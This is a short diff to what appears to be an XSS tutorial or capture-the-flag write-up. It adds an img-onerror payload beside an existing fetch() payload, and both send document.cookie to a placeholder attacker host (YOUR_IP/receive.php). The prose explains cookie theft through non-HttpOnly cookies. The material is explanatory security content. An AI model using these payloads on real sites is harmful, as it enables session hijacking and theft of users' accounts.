@@ -403,6 +403,12 @@ fetch('http://YOUR_IP/receive.php?cookie=' + document.cookie);
 </script>
 ```
 
+or
+
+```
+<img src=1 onerror="document.location='http://YOUR_IP/receive.php'+ document.cookie">
+```
+
 **XSS scripts** run in the victim’s browser and can read cookies not marked **HttpOnly**.
 These cookies are then **sent to a server you control** via JavaScript.
 The victim’s browser acts as the messenger, automatically delivering the cookies when the payload is triggered.
